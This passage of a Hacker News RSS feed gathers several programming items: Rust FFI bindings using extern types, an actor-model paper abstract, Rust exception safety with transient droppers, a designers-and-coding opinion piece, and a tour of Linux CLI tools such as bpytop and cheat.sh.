<p>That's one conditional double free and one API contract violation 🙁<br>(This <code>layer</code> wasn't "created by layer_create". We got it from the Window instance which presumably dismantles it on destruction.)</p>
<p>Can we do better? Not on stable. Our opaque newtypes above are zero-sized, so their address would likely be erased when handling references to them. Similarly the core type <a target="_blank" href="https://doc.rust-lang.org/stable/core/ffi/enum.c_void.html"><code>c_void</code></a> is, as of Rust 1.47.0, implemented as</p>
<pre><code><span>#[repr(u8)]</span>
<span>#[stable(feature = <span>"core_c_void"</span>, since = <span>"1.30.0"</span>)]</span>
<span>pub</span> <span><span>enum</span> <span>c_void</span></span> {
    <span>#[unstable(
        feature = <span>"c_void_variant"</span>,
        reason = <span>"temporary implementation detail"</span>,
        issue = <span>"none"</span>
    )]</span>
    <span>#[doc(hidden)]</span>
    __variant1,
    <span>#[unstable(
        feature = <span>"c_void_variant"</span>,
        reason = <span>"temporary implementation detail"</span>,
        issue = <span>"none"</span>
    )]</span>
    <span>#[doc(hidden)]</span>
    __variant2,
}
</code></pre>
<p>That's not unsized. It's actually quite a bit smaller than a usual reference too, so the compiler will most likely shift this memory around a lot if we create a <code>&amp;</code> or <code>&amp;mut</code> reference to this type!</p>
<p>💁‍♂️ <em><a target="_blank" href="https://doc.rust-lang.org/nomicon/what-unsafe-does.html">But even creating the Rust references would be undefined behaviour already</a>, if we use it as stand-in for opaque C types: We can't be sure that the memory location contains a valid discriminant for this enum (or, for that matter, </em>exists at all<em>, but that's secondary here). Creating a Rust reference to a (potentially) invalid value is immediately unsound, even without dereferencing it!</em></p>
<h3 id="there-is-a-better-way-coming">There is a better way (coming)</h3>
<p>As mentioned before, it is safe to create references to extern types regardless of their underlying data (though the API in question may limit this). With this in mind, we can rewrite our FFI bindings with full (shortened) documentation like this:</p>
<p>💁‍♂️ <em><strong>There is one important caveat to this.</strong> I'll get to it later, and it's a bit of a nasty footgun, so please bear with me.</em></p>
<pre><code><span>extern</span> <span>"C"</span> {
  <span><span>type</span> <span>Layer</span></span>; 
  <span><span>type</span> <span>Window</span></span>;

  
  <span><span>fn</span> <span>window_create</span></span>() -&gt; <span>Option</span>&lt;&amp;<span>'static</span> <span>mut</span> Window&gt;;

  
  <span><span>fn</span> <span>window_is_loaded</span></span>(window: &amp;<span>mut</span> Window) -&gt; <span>bool</span>;

  
  <span><span>fn</span> <span>window_set_background_color</span></span>(window: &amp;<span>mut</span> Window, background_color: GColor);

  
  <span><span>fn</span> <span>window_get_root_layer</span></span>(window: &amp;Window) -&gt; &amp;<span>mut</span> Layer;

  
  <span><span>fn</span> <span>window_destroy</span></span>(window: &amp;<span>'static</span> <span>mut</span> Window);

  
  <span><span>fn</span> <span>layer_destroy</span></span>(window: &amp;<span>'static</span> <span>mut</span> Layer);
}
</code></pre>
<p>That's short! The functions' signatures say a lot about how to call them already, so there was room to add other information undisturbed.</p>
<p>Something a bit peculiar is how commonly <code>&amp;'static mut ExternType</code> appears, which is pretty unidiomatic in regular Rust. I think the best way to describe these references is as "exclusive handle": There are no storage limitations on them, so you can move them across the heap without problem, but once you pass them into a function (like the destructors here), they are gone.</p>
<p>Let's try the previous usage example again:</p>
<pre><code><span>unsafe</span> {
  <span>let</span> window = window_create().unwrap(); 
  window_set_background_color(window, GREEN);
  <span>let</span> layer = window_get_root_layer(window);
  
  <span>if</span> !window_is_loaded(window) {
    window_destroy(window);
  }
  

  
  
  window_destroy(window);

  
  
  
  layer_destroy(layer);
}
</code></pre>
<p>Great! Note that this isn't perfect - we could for example destroy the root layer if we leak the window, which could be prevented with likely zero runtime cost with additional <code>#[repr(transparent)]</code> newtype wrappers and proxy functions - but for concise FFI bindings this is a seriously low footgun density.</p>
<p>💁‍♂️ <em>This is still an unsafe API in other respects. For example, the window stack API gives out long-lived window handles that collide with handles we already hold, and there are some places where valid parameters are limited in a way Rust's type system can't represent directly.</em></p>
<h3 id="the-caveat">The Caveat</h3>
<p>There is one really important rule to keep in mind when designing FFI bindings like this: <strong><a target="_blank" href="https://doc.rust-lang.org/nomicon/references.html">A mutable reference cannot be aliased</a></strong>. Doing so is immediately undefined behaviour.</p>
<p>On a safe API, this generally isn't a problem: There would be either exactly one location to acquire an exclusive handle like this, or wrapper types that drop the restriction internally. (We can't quite do this in a pure FFI binding, because the type in question would have to follow borrow semantics while implementing <a target="_blank" href="https://doc.rust-lang.org/stable/core/marker/trait.Copy.html"><code>Copy</code></a> to be passed as value.)</p>
<p>Here's an example:</p>
<pre><code>
<span>extern</span> <span>"C"</span> {
  <span><span>fn</span> <span>window_create</span></span>() -&gt; <span>Option</span>&lt;&amp;<span>'static</span> <span>mut</span> Window&gt;;
  <span><span>fn</span> <span>window_stack_push</span></span>(window: &amp;<span>mut</span> Window, animated: <span>bool</span>);
  <span><span>fn</span> <span>window_stack_pop</span></span>(animated: <span>bool</span>) -&gt; <span>Option</span>&lt;NonNull&lt;Window&gt;&gt;;
}

<span>unsafe</span> {
  <span>let</span> window = window_create()?;
  window_stack_push(window, <span>true</span>);
  
  <span>let</span> popped = window_stack_pop(<span>true</span>)?;
  
  window_stack_push(&amp;<span>mut</span> *popped, <span>true</span>); 
}
</code></pre>
<p>In the last line, <code>window</code> and the temporary mutable reference <code>&amp;mut *popped</code> are aliased. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.schichler.dev/semantic-ffi-bindings-in-rust-reactivating-the-borrow-checker-ckgxtoxo8057pwrs174dqhcsi">https://blog.schichler.dev/semantic-ffi-bindings-in-rust-reactivating-the-borrow-checker-ckgxtoxo8057pwrs174dqhcsi</a></em></p>]]>
            </description>
            <link>https://blog.schichler.dev/semantic-ffi-bindings-in-rust-reactivating-the-borrow-checker-ckgxtoxo8057pwrs174dqhcsi</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014515</guid>
            <pubDate>Sat, 07 Nov 2020 11:38:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced Join Patterns for the Actor Model Based on CEP Techniques]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25014513">thread link</a>) | @mpweiher
<br/>
November 7, 2020 | https://programming-journal.org/2021/5/10/ | <a href="https://web.archive.org/web/*/https://programming-journal.org/2021/5/10/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            


            
            
            <p>Humberto Rodriguez Avila<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>, Joeri De Koster<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>, and Wolfgang De Meuter<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></p>

<p>The Art, Science, and Engineering of Programming, 2021, Vol. 5, Issue 2, Article 10</p>

<p>Submission date: 2020-02-06<br>
Publication date: 2020-11-02<br>
DOI: <a href="https://doi.org/10.22152/programming-journal.org/2021/5/10">https://doi.org/10.22152/programming-journal.org/2021/5/10</a><br>
Full text: <a href="https://arxiv.org/pdf/2010.16301v1">PDF</a></p>

<h3 id="abstract">Abstract</h3>
<p>Context: Actor-based programming languages offer many essential features for developing modern distributed reactive systems. These systems exploit the actor model’s isolation property to fulfill their performance and scalability demands. Unfortunately, the reliance of the model on isolation as its most fundamental property requires programmers to express complex interaction patterns between their actors to be expressed manually in terms of complex combinations of messages sent between the isolated actors.</p>

<p>Inquiry: In the last three decades, several language design proposals have been introduced to reduce the complexity that emerges from describing said interaction and coordination of actors. We argue that none of these proposals is satisfactory in order to express the many complex interaction patterns between actors found in modern reactive distributed systems.</p>

<p>Approach:  We describe seven smart home automation scenarios (in which an actor represents every smart home appliance) to motivate the support by actor languages for five radically different types of message synchronization patterns, which are lacking in modern distributed actor-based languages. Fortunately, these five types of synchronisation patterns have been studied extensively by the Complex Event Processing (CEP) community. Our paper describes how such CEP patterns are elegantly added to an actor-based programming language.</p>

<p>Knowledge: Based on our findings, we propose an extension of the single-message matching paradigm of contemporary actor-based languages in order to support a multiple-message matching way of thinking in the same way as proposed by CEP languages. Our proposal thus enriches the actor-model by ways of declaratively describing complex message combinations to which an actor can respond.</p>

<p>Grounding: We base the problem-statement of the paper on an online poll in the home automation community that has motivated the real need for the CEP-based synchronisation operators between actors proposed in the paper. Furthermore, we implemented a DSL —— called Sparrow —— that supports said operators and we argue quantitatively (in terms of LOC and in terms of a reduction of the concerns that have to be handled by programmers) that the DSL outperforms existing approaches.</p>

<p>Importance: This work aims to provide a set of synchronization operators that help actor-based languages to handle the complex interaction required by modern reactive distributed systems. To the best of our knowledge, our proposal is the first one to add advanced CEP synchronization operators to the —— relatively simplistic single-message based matching —— mechanisms of most actor-based languages.</p>



          </section></div>]]>
            </description>
            <link>https://programming-journal.org/2021/5/10/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014513</guid>
            <pubDate>Sat, 07 Nov 2020 11:36:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exception safety in Rust: using transient droppers to prevent memory leaks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25014471">thread link</a>) | @lukastyrychtr
<br/>
November 7, 2020 | http://ngr.yt/blog/2020-11-03-exception-safety-in-rust-using-transient-droppers-to-prevent-memory-leaks.html | <a href="https://web.archive.org/web/*/http://ngr.yt/blog/2020-11-03-exception-safety-in-rust-using-transient-droppers-to-prevent-memory-leaks.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  
  <p>I have recently put in some documentation and code reviewing work to help with the 1.0.0 release of <a href="https://crates.io/crates/array-init">array-init</a>. This crate allows user to provide an initializer function that will be used to fill an array. The twist compared to Rust's <code>std</code> is that you don't have to first initialize your array with some valid value before running your function on every entry.</p>
<p>If that's what you need, using this crate saves you from having to figure out two things:</p>
<ol>
<li>How to properly use <code>MaybeUninit</code> and transmutations to manipulate uninitialized memory.</li>
<li>What to do in case the initializer fails, and you are left with only part of your entries initialized.</li>
</ol>
<p>Point 2 is called <em>exception safety</em> and it is what I'll talk about in this post.</p>
<h2>Exception safety</h2>
<p>The Rustonomicon has a whole <a href="https://doc.rust-lang.org/nomicon/exception-safety.html">chapter</a> dedicated to exception safety, which defines it as "being ready for unwinding". To understand what exception safety concretely means in the <code>array-init</code> case, let's look at the following simplified code<sup><a href="#codelicense">1</a></sup> which initializes an array:</p>
<pre><span>let mut</span><span> uninit_array: MaybeUninit&lt;[</span><span>usize</span><span>;</span><span>5</span><span>]&gt; = MaybeUninit::uninit();
</span><span>// pointer to array &lt;-&gt; pointer to first element
</span><span>let mut</span><span> ptr_i = uninit_array.</span><span>as_mut_ptr</span><span>() as *</span><span>mut usize</span><span>;
</span><span>let</span><span> array : [</span><span>usize</span><span>;</span><span>5</span><span>] = </span><span>unsafe </span><span>{
    </span><span>for</span><span> i in </span><span>0</span><span>..</span><span>5 </span><span>{
        </span><span>let</span><span> value_i = i;
        ptr_i.</span><span>write</span><span>(value_i);
        ptr_i = ptr_i.</span><span>add</span><span>(</span><span>1</span><span>);
    }
    uninit_array.</span><span>assume_init</span><span>()
};
assert_eq!(array, [</span><span>0</span><span>,</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>]);
</span></pre>
<p>This code is ok as is, but what if we where initializing an array of <code>T</code> from a function <code>f(i: usize) -&gt; T</code>? And what if this function <code>f</code> could fail and was instead of type <code>f(i: usize) -&gt; Option&lt;T&gt;</code>? Then we could start with something like this</p>
<pre><span>let mut</span><span> uninit_array: MaybeUninit&lt;[T;</span><span>5</span><span>]&gt; = MaybeUninit::uninit();
</span><span>// pointer to array &lt;-&gt; pointer to first element
</span><span>let mut</span><span> ptr_i = uninit_array.</span><span>as_mut_ptr</span><span>() as *</span><span>mut</span><span> T;
</span><span>let</span><span> array : Option&lt;[T;</span><span>5</span><span>]&gt; = </span><span>unsafe </span><span>{
    </span><span>for</span><span> i in </span><span>0</span><span>..</span><span>5 </span><span>{
        </span><span>let</span><span> value_i = </span><span>f</span><span>(i).</span><span>unwrap</span><span>();
        ptr_i.</span><span>write</span><span>(value_i);
        ptr_i = ptr_i.</span><span>add</span><span>(</span><span>1</span><span>);
    }
    Some(uninit_array.</span><span>assume_init</span><span>())
};
</span></pre>
<p>But then, what happen if we panic because <code>f</code> returned a <code>None</code>? (Note that even if <code>f</code> could only return a <code>T</code>, the problem still exists because <code>f</code> may panic.)</p>
<p>First, no safety is violated: the array memory is in a inconsistent state but because <code>None</code> is returned, it is not observable and hence we are still sound: <em>minimal</em> exception safety is preserved.</p>
<p>If <code>T</code> does not need drop-glue, this code is also <em>maximally</em> exception safe: I'm not exactly sure when but <code>uninit_array</code> will be dropped at some point, though none of its element will be (a property of <code>MaybeUninit</code>).
On the other hand, if <code>T</code> needs to be dropped to release some resources, then it will never be, and the memory that <code>f</code> allocated and the resources it took hold of will be leaked.</p>
<p>It is interesting here to pause and think about whether leaking objects is safe or not. Nowadays, it is pretty well indicated in the docs that leaking memory is not considered unsafe, but it <a href="http://cglab.ca/%7Eabeinges/blah/everyone-poops/#leakpocalypse">wasn't always so clear</a>. In any case, leaking memory when unwinding (and hence not being maximally exception-safe) is often considered <a href="https://github.com/Manishearth/array-init/pull/14#issuecomment-554406580">normal</a>.</p>
<h2>Transient droppers</h2>
<p>Now that the introduction is done, let's dive into the code itself. The code we are interested in, and that I detail after, is the following:</p>
<pre><span>let mut</span><span> uninit_array: MaybeUninit&lt;[T;</span><span>5</span><span>]&gt; = MaybeUninit::uninit();

</span><span>struct </span><span>TransientDropper {
    </span><span>base_ptr</span><span>: *</span><span>mut</span><span> T,
    </span><span>initialized_count</span><span>: </span><span>usize</span><span>,
}

</span><span>impl </span><span>Drop </span><span>for </span><span>TransientDropper {
    </span><span>fn </span><span>drop</span><span>(</span><span>self</span><span>: &amp;'_ </span><span>mut Self</span><span>) {
        </span><span>unsafe </span><span>{
            ptr::drop_in_place(slice::from_raw_parts_mut(
                </span><span>self</span><span>.base_ptr,
                </span><span>self</span><span>.initialized_count,
            ));
        }
    }
}

</span><span>let mut</span><span> ptr_i = uninit_array.</span><span>as_mut_ptr</span><span>() as *</span><span>mut</span><span> T;

</span><span>let mut</span><span> transient_dropper = TransientDropper {
    base_ptr: ptr_i,
    initialized_count: </span><span>0</span><span>,
};
</span><span>let</span><span> array : Option&lt;[T;</span><span>5</span><span>]&gt; = </span><span>unsafe </span><span>{
    </span><span>for</span><span> i in </span><span>0</span><span>..</span><span>5 </span><span>{
        </span><span>let</span><span> value_i = </span><span>f</span><span>(i).</span><span>unwrap</span><span>();
        ptr_i.</span><span>write</span><span>(value_i);
        ptr_i = ptr_i.</span><span>add</span><span>(</span><span>1</span><span>);
        transient_dropper.initialized_count += </span><span>1</span><span>;
    }
    mem::forget(transient_dropper);
    Some(uninit_array.</span><span>assume_init</span><span>())
};
</span></pre>
<p>The key novelty is <code>TransientDropper</code>. The transient dropper will be used to transiently own the values we have already initialized: during initialization of the array, if a panic occurs, the transient dropper will be dropped, and with it the already initialized elements.</p>
<p>The <code>TransientDropper</code> is implemented as follow.</p>
<pre><span>// TransientDropper has information akin to a slice:
// a base pointer, and the number of initialized
// elements from this pointer
</span><span>struct </span><span>TransientDropper {
    </span><span>base_ptr</span><span>: *</span><span>mut</span><span> T,
    </span><span>initialized_count</span><span>: </span><span>usize</span><span>,
}

</span><span>// Here is the whole logic: when TransientDropper
// is dropped, we need to drop the initialized_count
// elements that have already be initialized.
// This is done by dropping the slice containing them all.
</span><span>impl </span><span>Drop </span><span>for </span><span>TransientDropper {
    </span><span>fn </span><span>drop</span><span>(</span><span>self</span><span>: &amp;'_ </span><span>mut Self</span><span>) {
        </span><span>unsafe </span><span>{
            ptr::drop_in_place(slice::from_raw_parts_mut(
                </span><span>self</span><span>.base_ptr,
                </span><span>self</span><span>.initialized_count,
            ));
        }
    }
}
</span></pre>
<p>and is used here</p>
<pre><span>let</span><span> array : Option&lt;[T;</span><span>5</span><span>]&gt; = </span><span>unsafe </span><span>{
    </span><span>for</span><span> i in </span><span>0</span><span>..</span><span>5 </span><span>{
        </span><span>let</span><span> value_i = </span><span>f</span><span>(i).</span><span>unwrap</span><span>();
        ptr_i.</span><span>write</span><span>(value_i);
        ptr_i = ptr_i.</span><span>add</span><span>(</span><span>1</span><span>);
        </span><span>// We have initialized one more
        // more element and hence increase
        // the initialized_count
</span><span>        transient_dropper.initialized_count += </span><span>1</span><span>;
    }
    </span><span>// We need to forget the transient dropper,
    // see below.
    </span><span>mem::forget(transient_dropper);
    Some(uninit_array.</span><span>assume_init</span><span>())
};
</span></pre>
<p>It is capital to forget the transient dropper before returning the array, otherwise the array elements have two different owners, that are both going to try to drop them when they go out of scope, resulting in a use after free.</p>
<p>If you want to test what happens if you remove parts of this code, you can find it on the <a href="https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=af9709215c793425de001635e1d2e8ce">playground</a>.</p>

<p>Overall I find this solution much more elegant than something based on <code>catch_unwind</code>, and also more generic. If you don't want to implement it yourself, you may find the <a href="https://docs.rs/scopeguard/">scopeguard</a> crate interesting (note that I haven't tested it).</p>
<p>Also remarkable are tests for memory leak, which can be found on array-init's <a href="https://github.com/Manishearth/array-init/blob/9d05a598b8cddadf13151a884d479fde9928a1a9/src/lib.rs#L424-L472">github</a>. A crate with similar testing functionality is <a href="https://docs.rs/dropcheck">dropcheck</a> (which I haven't tested either).</p>
<p>Finally, I'd like to warmly thank <a href="https://danielhenrymantilla.github.io/">Daniel Henry-Mantilla</a>, who wrote the array-init code for leak-free exception safety and was kind enough to discuss with me by mail and indicate me many links used in this article.</p>
<hr>


</div></div>]]>
            </description>
            <link>http://ngr.yt/blog/2020-11-03-exception-safety-in-rust-using-transient-droppers-to-prevent-memory-leaks.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014471</guid>
            <pubDate>Sat, 07 Nov 2020 11:23:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Arch Conf 2020]]>
            </title>
            <description>
<![CDATA[
Score 110 | Comments 38 (<a href="https://news.ycombinator.com/item?id=25014421">thread link</a>) | @todsacerdoti
<br/>
November 7, 2020 | https://media.ccc.de/c/arch-conf-2020 | <a href="https://web.archive.org/web/*/https://media.ccc.de/c/arch-conf-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://media.ccc.de/c/arch-conf-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014421</guid>
            <pubDate>Sat, 07 Nov 2020 11:09:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Developers, do you think Designers should code?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25014337">thread link</a>) | @moeminm
<br/>
November 7, 2020 | https://blog.moeminmamdouh.com/developers-do-you-think-designers-should-code | <a href="https://web.archive.org/web/*/https://blog.moeminmamdouh.com/developers-do-you-think-designers-should-code">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1604745942823/3w1hPgLsq.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><p>I bring up this question in the hopes of creating a meaningful discussion, this is not a blog article to discuss <em>how</em> to ease the developer handoff process, but rather what my thoughts on the topic are.</p>

<p>I don't believe designers <em>should</em> know how to code, but I do believe that designers who do know how to code are incredibly valuable to organizations. They're a unicorn of some sort, if you will. There are 2 sides to this questions, to designers, I believe the answer to this question is whether or not you would like to be more employable. To developers, the answer is probably yes, as it <strong>will</strong> help when having discussions with the development team.</p>
<p>In startups, it's natural that everyone assume more responsibility than they should, that's just how startups are, so if you plan on working for startups, it's safe to assume you'll be more employable if you do know how to code, but also keep in mind that there's the added responsibility of bringing your design to life in production-ready code.</p>
<p>In bigger organizations, knowing how to code can save a lot of time spent going back and forth with the development team to check what can be implemented and what can't.</p>
<p>One of the bigger problems that could stem from designers knowing how to code is <strong>tunnel vision</strong>. You get hung up on the technical details so much that you limit yourself in terms of thought process which directly contradicts what UX is all about, user-centric design, and not technology-centric design. </p>

<p>One of the few reasons I took interest in coding was to bring my ideas to life. I wanted to start something of my own and I believe a lot of other designers feel that way. A year ago, I launched <a href="http://designtarget.org/" target="_blank">designtarget.org</a> – it was relatively successfully (at least to me, over 20k+ users and I learned so much during that time). None of this would have been possible had I not taken interest in coding, I wouldn’t have been able to launch the early versions of the website on GitHub, nor would I have, a few months later, moved to WP, and I definitely would not have been able to move later on to VueJs.</p>
<p>I took interest in coding, and it has helped me tremendously, I was able to start something of my own and it was invaluable to me as a designer.</p>
<p>Final thoughts? You do what you think is best for you and your career. Don’t feel pressured into anything, but know the benefits.</p>
<p>Do let me know in the comments below what <strong>you</strong> think. Let's get a discussion going.</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.moeminmamdouh.com/developers-do-you-think-designers-should-code</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014337</guid>
            <pubDate>Sat, 07 Nov 2020 10:46:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Useful Linux Unix Tools to Add to Your Toolbox]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25014328">thread link</a>) | @asafg6
<br/>
November 7, 2020 | https://www.turtle-techies.com/useful-linux-unix-tools-to-add-to-your-toolbox/ | <a href="https://web.archive.org/web/*/https://www.turtle-techies.com/useful-linux-unix-tools-to-add-to-your-toolbox/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <h4>Linux / Unix tools in a modern age</h4>

                    <p>
                        <h5>
                            2020-11-04
                        </h5>
                    </p>  
                </div><div>
                    <div itemprop="articleBody"><p>30 years ago software development was very low-level and systems administration was just computer para-scientists.
Today with so much high-level technology, many back-end or front-end programmers see the need to learn to use classic UNIX tools such as ps, grep, cat, pkill, and many others but also languages like Go, Rust, Python, and Javascript have been very successful in creating command-line tools with a higher user experience than the old ones.
In this way, many programmers choose these new tools much more comfortable, colorful, and in some cases even with better performance.</p>
<p>Here are several tools that help programmer productivity, study routines, write clean code, and even write less and do more:</p>
<p>It has been 47 years since the first release of <code>ps</code> (process status) a command-line tool to monitor processes in the operating system, widely used since then, and has not ceased to be important for any programmer and systems administrator.</p>
<p><img src="https://www.turtle-techies.com/useful-linux-unix-tools-to-add-to-your-toolbox/image01.png" alt="ps aux"></p><p>Another very important command-line tool is <code>pgrep</code> to which we give a regular expression as an argument and it returns a list of process identifiers that can be very useful if we want to stop a process or monitor it.</p>
<p>Many of these tools are a little complex to use and in our modern age, a couple of alternatives have begun to appear to improve the developer experience.</p>
<h2 id="htop">Htop <a href="#htop"><svg height="22px" viewBox="0 0 24 24" width="22px" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2><p>In 2006 Htop was created, a system to debug, monitor, and visualize processes in real-time.
It is a user interface where you can run commands like ps, pgrep, pkill without the need to directly type the commands.</p>

<p>In our modern times with the arrival of CLI’s created in languages ​​like Python, Go, Ruby, and Javascript, we can see how more interactive command-line tools have been created that provide a very comfortable user experience.</p>
<h2 id="the-arrival-of-bpytop">The arrival of BpyTOP <a href="#the-arrival-of-bpytop"><svg height="22px" viewBox="0 0 24 24" width="22px" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2><p>This 

<a href="https://github.com/aristocratos/bpytop" target="_blank">repository</a> on github hosts what could be said to be a modern child of htop.</p>
<p>The installation is technically easy, basically, we only need python 3.</p>
<p>A detailed installation guide is in the 

<a href="https://github.com/aristocratos/bpytop" target="_blank">repository</a>, but basically, it is a pip command to install the package.</p>
<div><pre><code data-lang="shell">
pip3 install bpytop --upgrade

bpytop

</code></pre></div>
<p>BpyTop has a comfortable user interface to help developers find and manage the process.
The interface is a new level of intuition which can help newbie developers to don’t lose their mind and be proactive.</p>
<h2 id="beyond-bpytop-goaccess">Beyond BpyTop: GoAccess <a href="#beyond-bpytop-goaccess"><svg height="22px" viewBox="0 0 24 24" width="22px" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2><p>This is another tool to manage system process with a big difference, can run into the browser.<br>
Yes, 

<a href="https://github.com/allinurl/goaccess" target="_blank">GoAccess</a> create a web server with a dashboard to check process.</p>

<p>This is perfect for virtual machines that have high computing tasks to evaluate the state of the machine and the memory use of the process.
As it is written entirely in C, its installation is very easy.
You can provide log files from Apache, Nginx, Amazon S3, Elastic Load Balancing, CloudFront, or many others to create metrics and statistics.
Can be installed using apt but is recommended using the source code to get a more updated version.
Link of installation documentation here.
Can be dockerized to use easily in Kubernetes or other container orchestrators.</p>
<h2 id="knowledge-lack">Knowledge Lack <a href="#knowledge-lack"><svg height="22px" viewBox="0 0 24 24" width="22px" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2><p>Currently, there are many different tools and every day new frameworks, cli, libraries, programming languages, ​​and more software are created that we must study to be up to date.
This inevitably means that our brain needs to collect more and more information and we will not always be able to retain everything without forgetting other things.</p>
<p>That is why kb was created.</p>
<p>kb is a command line to create and read code fragments and short notes that explain the code, in this way a person can keep in kb his collection of knowledge about some technology that he needs to master like the serverless cli, aws cli, GCP cli, firebase cli, python, ruby, or even Linux / UNIX commands like the aforementioned pgrep, pkill, ps.</p>
<p>The user can create categories like ‘servers‘, ‘tools‘, ‘languages‘, ‘frameworks‘ to create an order and hierarchy of their knowledge.</p>
<p>The 

<a href="https://github.com/gnebbia/kb#installation" target="_blank">installation</a> is very easy, as the 

<a href="https://github.com/gnebbia/kb" target="_blank">github repository</a> states.</p>
<div><pre><code data-lang="shell">
pip install -U kb-manager

</code></pre></div><div>
<p><img src="https://www.turtle-techies.com/useful-linux-unix-tools-to-add-to-your-toolbox/image05.gif" alt="kb"></p><p>
Image from the official repository <a href="https://github.com/gnebbia/kb">https://github.com/gnebbia/kb</a>
</p>
</div>
<p>If kb is not enough for you to save your knowledge, we have one more option.</p>
<h2 id="cheatsh">cheat.sh <a href="#cheatsh"><svg height="22px" viewBox="0 0 24 24" width="22px" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2><p>With almost 20,000 stars on 

<a href="https://github.com/chubin/cheat.sh" target="_blank">Github</a>, this open-source project has a vast database of cheat sheets from different areas such as cloud computing, programming languages, ​​and UNIX / Linux commands.</p>
<p>The best thing is that it does not need an installation, since its database is in the cloud and you can access any cheat sheet using an HTTP client like cURL.</p>
<p>This will give us a small cheatsheet about lambdas functions in python.</p>
<div><pre><code data-lang="shell">
curl cht.sh/python/lambda

</code></pre></div><p><img src="https://www.turtle-techies.com/useful-linux-unix-tools-to-add-to-your-toolbox/image06.png" alt="cheat.sh">
</p>
<p>The list of cheat sheets is so extensive that we can confidently use cURL and launch a couple of requests to the server that will work perfectly and give us important information on what we are looking for.</p>
<ol>
<li><code>curl cht.sh/javascript/async</code></li>
<li><code>curl cht.sh / javascript / ajax</code></li>
<li><code>curl cht.sh/javascript/json</code></li>
<li><code>curl cht.sh/javascript/loop</code></li>
<li><code>curl cht.sh/javascript/class</code></li>
<li><code>curl cht.sh/python/rest</code></li>
<li><code>curl cht.sh/nginx/proxy</code></li>
</ol>
<p>Another cheatsheets manager is 

